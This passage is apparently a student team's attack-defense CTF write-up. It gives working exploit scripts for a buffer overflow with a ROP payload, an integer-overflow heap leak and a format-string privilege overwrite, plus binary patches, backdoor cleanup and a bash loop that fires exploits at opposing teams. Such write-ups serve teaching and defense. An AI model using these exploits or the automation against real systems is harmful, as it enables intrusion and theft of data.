                payload += b'\xff'*16 + b'\x00\x1b\x02\x00\x04\x18\x0a' + bytes([i]) + b'\x00\x00\x00'
            payload += b'\xff'*16 + b'\x00\x00\x00' + b'A'*44
            payload += b'p\xcf\x0a\x08A\x9f\x15\x08\x15\xb4\x15\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x94\xf4\x04\x08\xed\x9f\x04\x08\x00\xd8\x29\x08\xdb\x26\x12\x08\x12\xed\x13\x08\x00\x01\x00\x00\xed\x9f\x04\x08\x03\x00\x00\x00\xe1\xd0\x0a\x08\xdf\xa7\x10\x08\x01\x00\x00\x00\xed\x9f\x04\x08\x00\xd8\x29\x08\xdb\x26\x12\x08\x12\xed\x13\x08\x00\x01\x00\x00\xed\x9f\x04\x08\x04\x00\x00\x00\xe1\xd0\x0a\x08\x40\xcf\x0a\x08\x00\x00\x00\x00\x00\x00\x00\x00'
            
            try:
                s = socket.socket()
                s.settimeout(10)
                s.connect((target, 8008))
                s.send(payload)
                s.shutdown(socket.SHUT_WR)
                data = b''
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                s.close()
                flags = re.findall(rb'[a-f0-9]{64}', data)
                if flags:
                    print(flags[0].decode())
            except:
                pass
       ```
    - Patch

      Through Ghidra analysis we identified that `FUN_0807a540` calls `read(fd, local_204, 0x200)` with `local_204` being only 84 bytes. The patch reduces the read size from `0x200` (512) to `0x40` (64 bytes),
      preventing the overflow from reaching the return address. Applied with:
      
        ```python
              #!/usr/bin/env python3
              from pathlib import Path
              import struct
        
              src = Path("securebgp")
              out = Path("securebgp_patched")
        
              data = bytearray(src.read_bytes())
        
              # FUN_0807a540: read(fd, local_204, 0x200) -> read(fd, local_204, 0x40)
              # local_204 is only 84 bytes, reading 0x200 causes stack overflow
              off = 0x29da3
              old = struct.pack("<I", 0x200)
              new = struct.pack("<I", 0x40)
        
              if data[off:off+4] != old:
                  raise SystemExit(f"Pattern mismatch: got {data[off:off+4].hex()}")
        
              data[off:off+4] = new
              out.write_bytes(data)
        
              print("File is patched saved as securebgp_patched")
        ```
  - **teis (port 8000)**
    
    - Vulnerability:
    
      Integer overflow → heap overflow
         
      By supplying the specially crafted large integer 2305843009213693968 (hex: 0x2000000000000010), we triggered an integer overflow — when this value is used in size arithmetic (e.g. size * element_size), it wraps around to a small value, causing a tiny heap allocation. The program then writes far beyond that allocation, leaking adjacent heap memory including the flag stored as a little-endian 64-bit integer. We used this vulnerability for the exploit.
    
    - Exploit:
       ```python
            #!/usr/bin/env python3
            from pwn import *
            import sys, struct, re
            
            context.log_level = 'error'
            target = sys.argv[1]
            
            try:
                io = remote(target, 8000, timeout=5)
                io.sendline(b'new\n2305843009213693968\nstop\n8\nAAAA\ncheck x\nlist\nquit')
                data = io.recvall(timeout=5)
            
                numbers = re.findall(rb'(-?\d+)', data)
            
                for start in range(len(numbers) - 7):
                    result = b''
                    valid = True
                    for n in numbers[start:start+8]:
                        v = int(n)
                        if v < 0 or v > 2**63:
                            valid = False
                            break
                        try:
                            result += struct.pack('<Q', v)
                        except:
                            valid = False
                            break
                    if not valid:
                        continue
                    decoded = result.decode('utf-8', errors='replace')
                    match = re.match(r'^[a-f0-9]{64}', decoded)
                    if match:
                        print(match.group(0))
                        break
                io.close()
            except:
                pass
       ```
      
    - Patch:
      
      We patched `create_sequence` and `search_subsequence` to block integer overflow via a code cave, adding bounds checking before the vulnerable arithmetic operations.
       ```python
            from pwn import *
            import os
            
            binary_path = "/teis"
            elf = ELF(binary_path)
            
            # Patch create_sequence
            # Original (13 bytes from 0x401673 to 0x40167f)
            # 401673: 48 8b 45 f8          mov rax, [rbp-0x8]
            # 401677: 48 8b 40 20          mov rax, [rax+0x20]
            # 40167b: 48 85 c0             test rax, rax
            # 40167e: 75 20                jne 4016a0
            context.arch = 'amd64'
            patch_create = asm('''
                dec rax
                shr rax, 12
                test rax, rax
                je 0x4016a0
                nop
            ''', vma=0x401673)
            elf.write(0x401673, patch_create)
            
            # Patch search_subsequence
            # Original (21 bytes from 0x401502 to 0x401516)
            # 401502: b8 00 00 00 00       mov eax, 0
            # 401507: e8 70 fd ff ff       call 40127c
            # 40150c: 48 89 45 e0          mov [rbp-0x20], rax
            # 401510: 48 83 7d e0 00       cmp QWORD PTR [rbp-0x20], 0
            # 401515: 75 14                jne 40152b
            patch_search = asm('''
                call 0x40127c
                mov [rbp-0x20], rax
                dec rax
                shr rax, 12
                test rax, rax
                je 0x40152b
            ''', vma=0x401502)
            elf.write(0x401502, patch_search)
            
            # Save patched binary
            out_path = "binaries/backup/teis_patched"
            elf.save(out_path)
            os.chmod(out_path, 0o755)
            print(f"Patched binary saved to {out_path}")
       ```
    
  - **thompson (port 8007)**
    - Vulnerability: Format string in `submit` command
      
    We observed format string payloads in the submit command stream via Tulip traffic analysis. The payload `%94$hhn` followed by a memory address was visible in captured traffic, In the following code section of the binary:
      <pre><code>
        1508: 48 8b 45 f8          mov    -0x8(%rbp),%rax 
        150c: 48 89 c7             mov    %rax,%rdi
        150f: b8 00 00 00 00       mov    $0x0,%eax
        1514: e8 97 fb ff ff       call   10b0 <printf@plt>
      </code></pre>
      The summary field was printed without proper sanitization. It is vulnerable to a format string attack, as it corresponds `printf(buffer)`. The buffer contains user input so an attacker could inject format specifiers such as `%p` or `%n`, allowing memory leaks and potentially arbitrary memory writes.
      
    - Exploit
      
      The exploit was based on the fact that the `quine` command was intended to work only for the privileged `_ken` admin user. By exploiting the format string vulnerability, we were able to overwrite memory related to the privilege check and gain access to the  hidden functionality. Once the overwrite succeeded, invoking quine revealed the trusted key/flag. 
      
      ```python
            #!/usr/bin/env python3
            from pwn import *
            import sys, re
            
            context.log_level = 'error'
            target = sys.argv[1]
            
            try:
                io = remote(target, 8007, timeout=10)
                io.recvuntil(b'tcc> ')
                io.sendline(b'register uff0d8729 uff0d8729')
                io.recvuntil(b'tcc> ')
                io.sendline(b'login uff0d8729 uff0d8729')
                io.recvuntil(b'tcc*> ')
                io.sendline(b'submit L%11$pL')
                io.recvuntil(b'tcc*> ', timeout=5)
                io.sendline(b'submit %94$hhnAA\xb0\xa7UUUU\x00\x00')
                io.recvuntil(b'tcc*> ', timeout=5)
                io.sendline(b'quine')
                data = io.recvuntil(b'tcc*> ', timeout=5)
                flags = re.findall(rb'[a-f0-9]{64}', data)
                if flags:
                    print(flags[0].decode())
                io.close()
            except:
                pass
      ```
    - Patch
      
       To patch the vulnerability, we replaced the call to `printf@plt` with `puts@plt`. The patched version effectively behaves as `puts(buffer)`, which safely prints the buffer as plain text without interpreting format               specifiers. This prevents attacker-controlled `%` sequences from being processed by the program. After the patch line 1514 was : `1514: e8 37 fb ff ff     call   1050 <puts@plt>`
      
        ```python
            #!/usr/bin/env python3
            from pathlib import Path
            import struct
            
            src = Path("thompson")
            out = Path("thompson_patched")
            
            data = bytearray(src.read_bytes())
            
            off = 0x1514
            old = bytes.fromhex("e897fbffff")
            
            # change function printf into puts 
            if data[off:off+5] != old:
                raise SystemExit(f"Pattern mismatch: got {data[off:off+5].hex()}")
            
            new_disp = 0x1050 - (0x1514 + 5)  # puts@plt - next instruction
            data[off:off+5] = b"\xe8" + struct.pack("<i", new_disp)
            
            out.write_bytes(data)
            
            print("File is patched saved as thompson_patched")
        ```
## iii) Recognized/Found Attacks on us (backdoors)

   **cherokee (port 8002)**
 
   We observed several teams sending percent-encoded path traversal requests (`GET /%2e%2e%2fkey`). We recognized this pattern in Tulip, replicated it and patched our own service.

   **teis (port 8000)**
   Traffic showed teams sending the integer 2305843009213693968 as part of a `new` command sequence. Recognizing the integer overflow pattern in the traffic, helped us build our own exploit.

   **thompson (port 8007)**
   We observed format string payloads in the submit command stream. This confirmed the printf vulnerability and helped us build our exploit.

  **Backdoors found on our VM**
  
   While inspecting active processes with ss -plantu, we noticed a suspicious entry running under the securebgp user:

   <pre><code>
        secureb+  266455       1  0 18:46 ?   [kworker/u2:0]
        secureb+  428545  266455  0 22:16 ?    _ sleep 300
   </code></pre>

   The process was disguised as a Linux kernel thread ([kworker/u2:0]), but the key giveaway was its user: real kernel threads always run as root. This one ran as securebgp, indicating it was planted by an attacker who had exploited the securebgp buffer overflow before we patched it. The sleep 300 child process revealed the pattern: the script was looping every 5 minutes, likely to exfiltrate our flag periodically.

   We traced the process back to disk using /proc:
   <pre><code>
        sudo -u securebgp ls -la /proc/266455/exe
        sudo -u securebgp ls -la /proc/266455/cwd
   </code></pre>

   The attacker had renamed a bash script to [kworker/u2:0] to blend in with the kernel thread list.

   <pre><code>
        sudo -u securebgp kill -9 266455 428545
        sudo rm -f /home/securebgp/[kworker/u2:0]
   </code></pre>
   Since the securebgp binary had already been patched by this point, the attacker had no way to re-establish access through the same vulnerability.

   We also found unauthorized entries in ~/.ssh/authorized_keys. Attackers who had gained code execution on our VM were injecting their own SSH public keys to establish persistent access independent of any service vulnerability. To handle this continuously throughout the competition, we deployed a cleanup script that ran in a loop, wiping the authorized_keys file
## iv) Strategy

**Exploitation strategy**

   Most of these exploits were not developed entirely by our team. Instead, we monitored the traffic through Tulip and analyzed the payloads that other teams were sending. Whenever we identified a potentially useful exploit, we tested it against our own environment and modified it when necessary. Not every exploit we captured was functional, but through repeated testing we managed to adapt several of them successfully. Once an exploit was confirmed to work reliably, we automated the process by creating bash scripts that periodically executed the attacks and retrieved flags from every target window. This strategy allowed us to maintain a steady stream of points throughout the competition while focusing our efforts on patching services and improving stability. 
   
**Patching strategy**
   
   The method we followed for most of the patches was to first identify the exploit, either by analyzing the vulnerable files ourselves or by observing and reproducing exploits used by other teams. After understanding how the attack worked, we proceeded to patch the corresponding vulnerabilities in our own services. For binary executables, we used the decompiler tool GHIDRA to reverse engineer the binaries, inspect their behavior, and identify vulnerable code paths. Since recompilation was not possible, we mainly relied on monkey patching techniques to modify the binaries directly. For Python-based services, patching was simpler, as we only needed to modify or remove the vulnerable lines in the source code. In several cases, we managed to patch the services before fully understanding or reproducing the correct exploit, which helped us reduce incoming attacks early during the competition.

**Duties within the team**

   A member monitored incoming traffic using Tulip and Pkappa2 to identify exploits being used against us, replicate them against other teams, and automate the successful ones, while the rest of the team each owned a service — analyzing it for vulnerabilities, developing patches and exploits independently, and as soon as a vulnerability was found, quickly communicating it to the traffic analyst so it could be patched fast before more flags were lost. Additionally, from the second day onward, a member was assigned to inspect for any backdoors or persistence mechanisms that opposing teams may have planted during successful exploits, ensuring our services remained clean and under our control.

**Important: For both patching and exploiting, we scanned service container images using Docker Scout. For example, this is how we identified CVE-2021-22204 in the bingo service.**

## Automation
All scripts followed the same pattern:
1. Try exploit against all 17 teams
2. Submit valid flags to the CTF API
3. Sleep 6 minutes (just under the 15-minute tick) to ensure each exploit ran at least twice per window, guaranteeing we captured the flag even if one run failed or the target was briefly unavailable
4. Repeat

An example of automated bash script is (all followed the same logic):
```bash
    #!/bin/bash
    API_KEY=""
    
    while true; do
        echo "=== $(date) ==="
        SUBMITTED=0
    
        for ip in 2 6 10 14 18 22 26 30 34 38 46 50 54 58 62 66 70; do
            HOST="10.219.255.$ip"
    
            FLAG=$(python3 ~/exploit_teis.py "$HOST" 2>/dev/null)
    
            if [ ! -z "$FLAG" ]; then
                RESULT=$(curl -s --max-time 5 https://ctf.hackintro.di.uoa.gr/submit \
                    -H "Content-Type: application/json" \
                    -H "Authorization: Bearer $API_KEY" \
                    -d "{\"flag\": \"$FLAG\"}")
    
                echo "[$HOST] $RESULT"
                SUBMITTED=$((SUBMITTED+1))
            else
                echo "[$HOST] no flag"
            fi
        done
    
        echo "[*] Submitted $SUBMITTED flags. Sleeping 6 minutes..."
      sleep 360
    done
```
## v) Lessons Learnt / What we would have done differently?

  **Lessons (Key takeaways)**
  - Automation is key. So exploits can run the whole time.
  - It is more efficient to monitor traffic and recognize the attacks the opponents send rather than trying to find exploits on your own.
  - Always set up your tools before the competition started.
  - Always search for open CVEs in your code.
  - Instead of patching someone has to look if a team put a backdoor on us during an exploit (we found some).
  - Always monitor opponent traffic.
  - Minimal patches are always the best.
    
  **What we would have done differently?**

  - Focus more on patching faster as the services which were released on Saturday were patched after 8 hours (too late).
  - Keep more notes about the exploit/patch scripts. It took us much time to find the scripts when we wrote this `writeup.md`.
  - Rotate more frequently among the services, for fresh ideas.
  - Try to put backdoors earlier as when we thought about it, it was too late. the majority of the services were patched or down. However we managed to create a backdoor on another team, just to learn how to do it.

## Tools 
  - Ghidra
  - Tulip
  - Pkappa2
